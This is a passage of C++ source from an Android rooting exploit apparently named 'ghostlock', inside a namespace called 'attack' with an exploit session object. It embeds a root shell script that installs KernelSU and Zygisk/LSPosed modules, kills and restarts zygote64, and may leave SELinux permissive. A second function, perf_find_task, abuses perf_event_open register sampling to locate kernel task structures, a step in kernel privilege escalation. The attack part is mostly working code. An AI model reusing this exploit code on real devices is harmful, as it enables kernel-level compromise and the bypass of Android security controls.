            "  run_root() {\n"
            "    if [ -z \"$SU\" ]; then sh -c \"$1\"; else timeout 120 \"$SU\" -c \"$1\"; fi\n"
            "  }\n"
            "  touch /data/local/tmp/.ghostlock_vector_managed 2>/dev/null\n"
            "  if [ ! -x \"$KSU_KSUD\" ]; then\n"
            "    echo \"[!] installed ksud missing ($KSU_KSUD); skipping LSPosed stack\" >>\"$LOG\"\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR='installed ksud missing'; write_status\n"
            "  else\n"
            "    cat >/data/local/tmp/.ghostlock_modinstall.sh <<'MODINSTEOF'\n"
            "#!/system/bin/sh\n"
            "MODDIR=\"$1\"\n"
            "KSUD=\"$2\"\n"
            "rm -rf /data/adb/modules/zygisk_vector /data/adb/modules/rezygisk\n"
            "for z in \"$MODDIR\"/*.zip; do\n"
            "  [ -f \"$z\" ] || continue\n"
            "  echo \"[*] installing module $z\"\n"
            "  \"$KSUD\" module install \"$z\"\n"
            "  RC=$?\n"
            "  echo \"[*] module install exit=$RC\"\n"
            "  if [ $RC -ne 0 ]; then echo \"[!] module install failed: $z\"; exit $RC; fi\n"
            "done\n"
            "MODINSTEOF\n"
            "    run_root \"sh /data/local/tmp/.ghostlock_modinstall.sh \"$LSPD_MODULES\" \"$KSU_KSUD\"\" >>\"$LOG\" 2>&1\n"
            "    MOD_RC=$?\n"
            "    echo \"[*] module install step finished rc=$MOD_RC\" >>\"$LOG\"\n"
            "    if [ $MOD_RC -ne 0 ]; then\n"
            "      STATE=failed; BUSY=0; READY=0; ERROR='module install failed'; write_status\n"
            "      echo 'op:activation fail: module install failed' >>\"$LOG\"\n"
            "      exit 1\n"
            "    fi\n"
            "    chmod 755 /data/adb/modules/zygisk_vector/daemon /data/adb/modules/zygisk_vector/cli 2>/dev/null\n"
            "    chmod 755 /data/adb/modules/rezygisk/bin/* 2>/dev/null\n"
            "    STATE=applying; write_status\n"
            "# Re-run late-load so the just-installed modules are picked up.\n"
            "# Unconditional: the app route used to skip this and the Zygisk\n"
            "# stack stayed inert after a successful install.\n"
            "    echo '[*] late-load (apply modules)' >>\"$LOG\"\n"
            "    run_root \"$KSU_KSUD late-load --kmi $KMI --allow-shell\" >>\"$LOG\" 2>&1\n"
            "    echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
            "    echo '[*] starting zygisk daemon (post-fs-data)' >>\"$LOG\"\n"
            "    run_root \"nohup $KSU_KSUD post-fs-data >/data/local/tmp/pfsd.log 2>&1 &\" >>\"$LOG\" 2>&1\n"
            "    echo \"[*] post-fs-data launch rc=$?\" >>\"$LOG\"\n"
            "    cat >/data/local/tmp/.ghostlock_zrready.sh <<'ZRREADYEOF'\n"
            "#!/system/bin/sh\n"
            "i=0\n"
            "while [ $i -lt 60 ]; do\n"
            "  MP=$(pidof zygisk-ptrace64 2>/dev/null | awk '{print $1}')\n"
            "  if [ -n \"$MP\" ]; then\n"
            "    TP=$(sed -n 's/^TracerPid:[[:space:]]*//p' /proc/1/status 2>/dev/null)\n"
            "    if [ \"$TP\" = \"$MP\" ]; then echo \"monitor=$MP tracing init\"; exit 0; fi\n"
            "  fi\n"
            "  sleep 1\n"
            "  i=$((i+1))\n"
            "done\n"
            "exit 1\n"
            "ZRREADYEOF\n"
            "    ZREADY=$(run_root 'sh /data/local/tmp/.ghostlock_zrready.sh' 2>/dev/null)\n"
            "    if [ -z \"$ZREADY\" ]; then\n"
            "      echo '[!] rezygisk not ready (monitor not tracing / no zygisk_vector in modules); NOT restarting zygote' >>\"$LOG\"\n"
            "      echo '[!] the LSPosed stack stays inactive this run; run it again once the daemon is up' >>\"$LOG\"\n"
            "      echo '[*] pfsd.log:' >>\"$LOG\"\n"
            "      tail -n 40 /data/local/tmp/pfsd.log >>\"$LOG\" 2>&1\n"
            "      echo '[*] rezygisk bin:' >>\"$LOG\"\n"
            "      ls -l /data/adb/modules/rezygisk/bin >>\"$LOG\" 2>&1\n"
            "      echo \"[*] monitor=$(pidof zygisk-ptrace64 2>/dev/null) init_tracer=$(awk '/TracerPid/{print $2}' /proc/1/status 2>/dev/null)\" >>\"$LOG\"\n"
            "      STATE=failed; BUSY=0; READY=0; ERROR=rezygisk not ready; write_status\n"
            "    else\n"
            "      echo '[*] rezygisk monitor ready' >>\"$LOG\"\n"
            "      STATE=zygote; write_status\n"
            "      cat >/data/local/tmp/.ghostlock_zrfinish.sh <<'ZRFINEOF'\n"
            "#!/system/bin/sh\n"
            "LOG='%s'\n"
            "HOME_DIR=${LOG%%/*}\n"
            "STATUS=\"$HOME_DIR/.ghostlock_status\"\n"
            "RUN_ID=$(sed -n 's/^run_id=//p' \"$STATUS\" 2>/dev/null | head -1)\n"
            "BOOT_ID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)\n"
            "SUPERVISOR_PID=$$\n"
            "STATE=waiting_injection\n"
            "BUSY=1\n"
            "READY=0\n"
            "ERROR=\n"
            "write_status() {\n"
            "  { echo 'schema=1'; echo \"run_id=$RUN_ID\"; echo \"boot_id=$BOOT_ID\"; echo \"pid=$SUPERVISOR_PID\"; echo \"state=$STATE\"; echo \"busy=$BUSY\"; echo \"ready=$READY\"; echo \"error=$ERROR\"; echo \"log=$LOG\"; echo \"updated=$(date +%%s 2>/dev/null)\"; } >\"$STATUS.tmp\" && chmod 644 \"$STATUS.tmp\" 2>/dev/null && mv \"$STATUS.tmp\" \"$STATUS\"\n"
            "  if [ \"$STATE\" = \"ready\" ] || [ \"$STATE\" = \"failed\" ]; then rm -f \"$HOME_DIR/.ghostlock_run_started\" 2>/dev/null; fi\n"
            "}\n"
            "finisher_exit() {\n"
            "  RC=$?\n"
            "  if [ \"$RC\" -ne 0 ] && [ \"$STATE\" != \"failed\" ] && [ \"$STATE\" != \"ready\" ]; then\n"
            "    STATE=failed; BUSY=0; READY=0; ERROR=\"finisher exited $RC\"; write_status\n"
            "    echo \"[!] finisher exited $RC; marked failed\" >>\"$LOG\"\n"
            "  fi\n"
            "}\n"
            "trap finisher_exit EXIT\n"
            "write_status\n"
            "STATE_J=/data/adb/rezygisk/state.json\n"
            "ZROK=0\n"
            "i=0\n"
            "while [ $i -lt 90 ]; do\n"
            "  ZOUT=$(cat \"$STATE_J\" 2>/dev/null)\n"
            "  if echo \"$ZOUT\" | grep -q '\"64\": 1' && echo \"$ZOUT\" | grep -q 'zygisk_vector' && echo \"$ZOUT\" | grep -q '\"state\": 1'; then\n"
            "    ZROK=1\n"
            "    echo '[*] zygote injected; rezygiskd.64 state=1, modules has zygisk_vector' >>\"$LOG\"\n"
            "    break\n"
            "  fi\n"
            "  # Bypass: state.json is only written by the monitor that traced the\n"
            "  # zygote itself. A zygote injected by an earlier monitor (or before\n"
            "  # this monitor restart) never gets a state.json - but its maps\n"
            "  # already prove the zygisk_vector lib is loaded. Accept that.\n"
            "  ZPID=$(pidof zygote64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "  if [ -n \"$ZPID\" ] && grep -q zygisk_vector /proc/$ZPID/maps 2>/dev/null; then\n"
            "    ZROK=1\n"
            "    echo \"[*] zygote pid=$ZPID already has zygisk_vector in maps (state.json stale/absent); accepting\" >>\"$LOG\"\n"
            "    break\n"
            "  fi\n"
            "  sleep 1\n"
            "  i=$((i+1))\n"
            "done\n"
            "if [ \"$ZROK\" != 1 ]; then\n"
            "  STATE=failed; BUSY=0; READY=0; ERROR='zygote injection gate failed'; write_status\n"
            "  echo '[!] injection gate failed after 90s; NOT starting the Vector daemon' >>\"$LOG\"\n"
            "  echo \"[!] rezygisk state: $ZOUT\" >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "STATE=injected; write_status\n"
            "sleep 60\n"
            "if [ -x /data/adb/modules/zygisk_vector/daemon ]; then\n"
            "  echo '[*] starting Vector daemon (it restarts system_server once)' >>\"$LOG\"\n"
            "  unshare -m /data/adb/modules/zygisk_vector/daemon --system-server-max-retry=3 >/data/local/tmp/vectord.log 2>&1 &\n"
            "  rm -f /data/adb/ghostlock-vector-managed\n"
            "  rm -f /data/local/tmp/.ghostlock_vector_managed\n"
            "fi\n"
            "sleep 20\n"
            "STATE=daemon; write_status\n"
            "STATE=stage2; write_status\n"
            "echo '[*] stage2 checks' >>\"$LOG\"\n"
            "CLI_OK=0\n"
            "i=0\n"
            "while [ $i -lt 12 ]; do\n"
            "  CLI_OUT=$(timeout 15 /data/adb/modules/zygisk_vector/cli status 2>&1)\n"
            "  case \"$CLI_OUT\" in *\"Framework Version\"*) CLI_OK=1; break;; esac\n"
            "  sleep 5\n"
            "  i=$((i+1))\n"
            "done\n"
            "if [ \"$CLI_OK\" = 1 ]; then\n"
            "  echo '[*] stage2 check cli=PASS' >>\"$LOG\"\n"
            "else\n"
            "  echo '[!] stage2 check cli=FAIL' >>\"$LOG\"\n"
            "  echo \"[!] stage2 cli output: $CLI_OUT\" >>\"$LOG\"\n"
            "fi\n"
            "STATE_OK=0\n"
            "if grep -q 'KernelSU' /data/adb/rezygisk/state.json 2>/dev/null && \\\n"
            "   grep -q 'zygisk_vector' /data/adb/rezygisk/state.json 2>/dev/null && \\\n"
            "   grep -q '\"64\": 1' /data/adb/rezygisk/state.json 2>/dev/null; then\n"
            "  STATE_OK=1\n"
            "  echo '[*] stage2 check state=PASS (state.json)' >>\"$LOG\"\n"
            "else\n"
            "  # Same bypass as the injection gate: state.json only exists for a\n"
            "  # zygote this monitor traced from its own start. A live zygote with\n"
            "  # zygisk_vector mapped is equivalent proof of injection.\n"
            "  ZPID=$(pidof zygote64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "  if [ -n \"$ZPID\" ] && grep -q zygisk_vector /proc/$ZPID/maps 2>/dev/null; then\n"
            "    STATE_OK=1\n"
            "    echo \"[*] stage2 check state=PASS (zygote pid=$ZPID maps, state.json absent)\" >>\"$LOG\"\n"
            "  else\n"
            "    echo '[!] stage2 check state=FAIL' >>\"$LOG\"\n"
            "  fi\n"
            "fi\n"
            "PID_OK=0\n"
            "if [ -n \"$(pidof zygisk-ptrace64 2>/dev/null)\" ]; then\n"
            "  PID_OK=1\n"
            "  echo '[*] stage2 check pid=PASS' >>\"$LOG\"\n"
            "else\n"
            "  echo '[!] stage2 check pid=FAIL' >>\"$LOG\"\n"
            "fi\n"
            "if [ \"$CLI_OK\" = 1 ] && [ \"$STATE_OK\" = 1 ] && [ \"$PID_OK\" = 1 ]; then\n"
            "  echo '[+] stage2 check PASS' >>\"$LOG\"\n"
            "else\n"
            "  echo \"[!] stage2 check FAIL cli=$CLI_OK state=$STATE_OK pid=$PID_OK\" >>\"$LOG\"\n"
            "fi\n"
            "if [ \"$CLI_OK\" = 1 ] && [ \"$STATE_OK\" = 1 ] && [ \"$PID_OK\" = 1 ]; then\n"
            "  STATE=ready; BUSY=0; READY=1; ERROR=; write_status\n"
            "  echo 'op:activation ok' >>\"$LOG\"\n"
            "  echo '[+] LSPosed stack setup done' >>\"$LOG\"\n"
            "  if [ \"$READY\" = 1 ]; then\n"
            "    echo '[*] supervisor ready' >>\"$LOG\"\n"
            "    HB=0\n"
            "    while :; do\n"
            "      HB=$((HB+1))\n"
            "      if [ \"$READY\" = 1 ] && [ $HB -ge 30 ]; then HB=0; write_status; fi\n"
            "      sleep 1\n"
            "    done\n"
            "  fi\n"
            "else\n"
            "  echo '[!] activation stopped: stage2 checks failed' >>\"$LOG\"\n"
            "  echo '[*] vectord.log:' >>\"$LOG\"\n"
            "  tail -n 60 /data/local/tmp/vectord.log >>\"$LOG\" 2>&1\n"
            "  echo '[*] rezygisk state:' >>\"$LOG\"\n"
            "  cat /data/adb/rezygisk/state.json >>\"$LOG\" 2>&1\n"
            "  if [ ! -x /data/adb/modules/zygisk_vector/daemon ]; then\n"
            "    echo '[!] Vector daemon missing or not executable' >>\"$LOG\"\n"
            "  fi\n"
            "  STATE=failed; BUSY=0; READY=0; ERROR='stage2 failed'; write_status\n"
            "  exit 1\n"
            "fi\n"
            "ZRFINEOF\n"
            "      if [ ! -s /data/local/tmp/.ghostlock_zrfinish.sh ]; then\n"
            "        STATE=failed; BUSY=0; READY=0; ERROR=finisher missing; write_status\n"
            "        echo '[!] finisher missing; not restarting zygote' >>\"$LOG\"\n"
            "      else\n"
            "        rm -f /data/adb/rezygisk/state.json\n"
            "        OLD_MON=$(pidof zygisk-ptrace64 2>/dev/null | tr -d '\\r' | awk '{print $1}')\n"
            "        if [ -n \"$OLD_MON\" ]; then\n"
            "          echo \"[*] restarting rezygisk monitor pid=$OLD_MON\" >>\"$LOG\"\n"
            "          kill -9 $OLD_MON >>\"$LOG\" 2>&1\n"
            "        fi\n"
            "        ( cd /data/adb/modules/rezygisk && sh ./post-fs-data.sh ) >>\"$LOG\" 2>&1\n"
            "        MON_OK=0; mi=0\n"
            "        while [ $mi -lt 20 ]; do\n"
            "          TP=$(sed -n 's/^TracerPid:[[:space:]]*//p' /proc/1/status 2>/dev/null | tr -d '\\r')\n"
            "          if [ -n \"$TP\" ] && [ \"$TP\" != 0 ]; then MON_OK=1; echo \"[*] monitor tracing init tracer=$TP\" >>\"$LOG\"; break; fi\n"
            "          sleep 1; mi=$((mi+1))\n"
            "        done\n"
            "        if [ \"$MON_OK\" != 1 ]; then\n"
            "          STATE=failed; BUSY=0; READY=0; ERROR='rezygisk monitor not tracing init'; write_status\n"
            "          echo '[!] monitor not tracing init after 20s; NOT restarting zygote' >>\"$LOG\"\n"
            "          exit 1\n"
            "        fi\n"
            "        setsid sh /data/local/tmp/.ghostlock_zrfinish.sh </dev/null >/dev/null 2>&1 &\n"
            "        echo '[*] finisher detached; restarting zygote64' >>\"$LOG\"\n"
            "        OLD_ZYGOTE=''\n"
            "        for zp in $(pidof zygote64 2>/dev/null | tr -d '\\r'); do\n"
            "          if [ \"$(cat /proc/$zp/comm 2>/dev/null)\" = \"zygote64\" ] || \\\n"
            "             tr '\\0' ' ' < /proc/$zp/cmdline 2>/dev/null | grep -q zygote64; then\n"
            "            PP=$(awk '/^PPid:/{print $2}' /proc/$zp/status 2>/dev/null)\n"
            "            if [ \"$PP\" = \"1\" ]; then OLD_ZYGOTE=$zp; break; fi\n"
            "          fi\n"
            "        done\n"
            "        if [ -n \"$OLD_ZYGOTE\" ]; then\n"
            "          echo \"[*] killing zygote64 pid=$OLD_ZYGOTE (comm/cmdline/PPID verified)\" >>\"$LOG\"\n"
            "          kill -9 $OLD_ZYGOTE >>\"$LOG\" 2>&1\n"
            "        else\n"
            "          echo '[!] no verified zygote64 found; NOT killing anything' >>\"$LOG\"\n"
            "        fi\n"
            "      fi\n"
            "    fi\n"
            "  fi\n"
            "else\n"
            "  echo '[*] no LSPosed component packages selected; skipping the stack' >>\"$LOG\"\n"
            "  STATE=root; BUSY=0; READY=0; write_status\n"
            "fi\n"
            "if [ \"$SELINUX_FIXUP\" = \"0\" ]; then\n"
            "  echo '[*] late-load (last step of the app route)' >>\"$LOG\"\n"
            "  chmod 755 \"$KSUD\" 2>/dev/null\n"
            "  timeout 60 \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
            "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
            "  if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
            "    echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
            "  else\n"
            "    echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
            "  fi\n"
            "fi\n"
            "else\n"
            "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
            "fi\n",
            (config::runtime_config_snapshot().home_dir.c_str()),
            (config::runtime_config_snapshot().ksu_log_path.c_str()),
            session::g_exploit_session.profile.safe_mode() ? 1 : 0,
            (config::runtime_config_snapshot().ksud_path.c_str()),
            (config::runtime_config_snapshot().lspd_modules_path.c_str()),
            (config::runtime_config_snapshot().selinux_fixup ? "1" : "0"),
            (config::runtime_config_snapshot().phase.c_str()),
            (config::runtime_config_snapshot().debug_dir.c_str()),
            (config::runtime_config_snapshot().ksu_log_path.c_str()));
        if (n < 0 || n >= static_cast<int32_t>(script.size())) {
            pr_warning("root script too long\n");
            return;
        }
        if (write(sfd.get(), script.data(), static_cast<size_t>(n)) != n) {
            pr_warning("write root script failed errno=%d\n", errno);
        }
        sfd.reset();
        chmod((config::runtime_config_snapshot().root_script_path.c_str()), 0755);
        pr_info("root script written path=%s bytes=%d\n", (config::runtime_config_snapshot().root_script_path.c_str()),
                n);
    }

    /* Find a task through perf sample records. */
    uintptr_t perf_find_task(void) {
        struct perf_event_attr pe{};
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_CPU_CLOCK;
        pe.sample_period = 5000;
        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
        pe.sample_regs_intr = (1ULL << 32) - 1;
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        pe.exclude_idle = 1;

        errno = 0;
        support::UniqueFd fd(static_cast<int32_t>(syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0)));
        if (!fd.valid()) {
            pr_warning("perf_event_open failed errno=%d\n", errno);
            return 0;
        }
        constexpr size_t kPerfPageSize = 4096;
        constexpr size_t kPerfDataPages = 32;
        constexpr size_t kPerfDataSize = kPerfPageSize * kPerfDataPages;
        const size_t msz = kPerfPageSize + kPerfDataSize;
        void *mapped = mmap(nullptr, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) {
            pr_warning("perf mmap failed errno=%d\n", errno);
            return 0;
        }
        /* Declaration order keeps the original release order: munmap (buf) runs
         * before close (fd) when this scope exits. */
        support::MappedRegion buf(mapped, msz);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        for (int32_t i = 0; i < 500000; i++) syscall(__NR_getpid);
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
        char *base = reinterpret_cast<char *>(buf.data()) + kPerfPageSize;
        uint64_t pos = hdr->data_tail;
        std::array<uintptr_t, 256> cands{};
        int32_t nc = 0;
        while (pos < head && nc < static_cast<int32_t>(cands.size())) {
            auto *ev = reinterpret_cast<struct perf_event_header *>(
                base + (pos % kPerfDataSize));
            if (ev->size == 0) break;
            if (ev->type == PERF_RECORD_SAMPLE) {
                char *p = reinterpret_cast<char *>(ev) + sizeof(*ev);
                p += 8; /* skip IP */
                uint64_t abi = *reinterpret_cast<uint64_t *>(p);
                p += 8;
                if (abi == 1 || abi == 2) {
                    uint64_t *regs = reinterpret_cast<uint64_t *>(p);
                    for (int32_t i = 0; i < 32 && nc < static_cast<int32_t>(cands.size()); i++) {
                        uint64_t v = regs[i];
                        /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
                        v |= 0x0fULL << 56;
                        if (in_direct_map(v))
                            cands[static_cast<size_t>(nc++)] = v;
                    }
                }
            }
            pos += ev->size;
        }
        hdr->data_tail = head;
        if (!nc) return 0;
        uintptr_t best = 0;
        int32_t best_cnt = 0;
        for (int32_t i = 0; i < nc; i++) {
            const auto at = cands[static_cast<size_t>(i)];
            const int32_t cnt = static_cast<int32_t>(
                std::count(cands.begin(), cands.begin() + nc, at));
            if (cnt > best_cnt) {
                best_cnt = cnt;
                best = at;
            }
        }
        pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
        return best;
    }
} // namespace ghostlock::attack
